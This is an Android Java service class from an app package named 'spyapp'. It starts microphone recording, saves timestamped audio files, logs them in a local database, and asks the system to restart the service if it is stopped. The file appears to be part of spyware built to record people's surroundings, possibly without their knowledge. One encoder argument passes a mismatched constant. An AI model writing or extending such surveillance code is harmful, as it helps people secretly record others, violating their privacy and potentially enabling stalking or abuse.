package com.app.spyapp.service;

import android.app.Service;
import android.content.Intent;
import android.media.AudioRecord;
import android.media.MediaRecorder;
import android.os.Environment;
import android.os.IBinder;
import android.support.annotation.Nullable;

import com.app.spyapp.R;
import com.app.spyapp.SpyApp;
import com.app.spyapp.common.Utils;
import com.app.spyapp.model.AudioRecordModel;

import java.io.File;
import java.io.IOException;
import java.util.Calendar;

public class AudioRecordService extends Service {
    private MediaRecorder myAudioRecorder;
    private SpyApp spyApp;


    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        spyApp=(SpyApp)getApplicationContext();
        Utils.showStatus(this, "RECORD AUDIO");
        recordAudio();
        return Service.START_STICKY;

    }

    private void recordAudio() {


        String path = Utils.getPathofFiles() + "/";
        File file1 = new File(path);
        if (!file1.exists()) {
            file1.mkdirs();
        }

        String filename = "recording_" + System.currentTimeMillis() + ".3gp";
        final File file2 = new File(file1, filename);
        if (!file2.exists()) {
            try {
                file2.createNewFile();
            } catch (IOException e) {
                e.printStackTrace();
            }
        }

        myAudioRecorder = new MediaRecorder();
        myAudioRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
        myAudioRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
        myAudioRecorder.setAudioEncoder(MediaRecorder.OutputFormat.AMR_NB);
        myAudioRecorder.setOutputFile(file2.getPath());
        try {
            myAudioRecorder.prepare();
        } catch (IOException e) {
            e.printStackTrace();
        }
        myAudioRecorder.start();
        AudioRecordModel audioRecordModel = new AudioRecordModel();
        audioRecordModel.setFilename(filename);
        audioRecordModel.setFilepath(file2.getPath());
        audioRecordModel.setRecordDate(Utils.convertMilisToDate(Calendar.getInstance().getTimeInMillis()));
        spyApp.getDatabaseHelper().insertAudioRecord(audioRecordModel);
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        if (myAudioRecorder != null) {
            myAudioRecorder.stop();
            myAudioRecorder.release();
            myAudioRecorder = null;
        }
    }
}
